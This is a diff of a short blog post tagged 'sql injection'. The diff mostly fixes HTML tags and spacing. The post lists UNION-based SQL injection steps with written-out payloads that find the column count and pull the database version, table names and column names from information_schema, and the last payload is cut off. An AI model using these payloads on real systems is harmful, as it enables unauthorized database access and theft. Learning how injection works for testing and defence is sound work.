@@ -5,13 +5,12 @@ date: 2012-10-04 17:18:44
 tags: sql sql injection
 ---
 
-</p>
+<p>
 {% highlight sql %}
 SELECT user
 FROM users 
 WHERE user.name = 'jeffrey';
 {% endhighlight %}
-
 
 
 1. FIND NUMBER OF COLUMNS
@@ -20,4 +19,5 @@ WHERE user.name = 'jeffrey';
 	' union select 1,2,3,version() -- -
 3. NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO
 	' union select 1,2,3,table_name from information_schema.tables where table_schema="x8250" -- -
-	' union select 1,2,3,column_name from information_schema.columns where table...<p>
+  ' union select 1,2,3,column_name from information_schema.columns where table...
+</p>
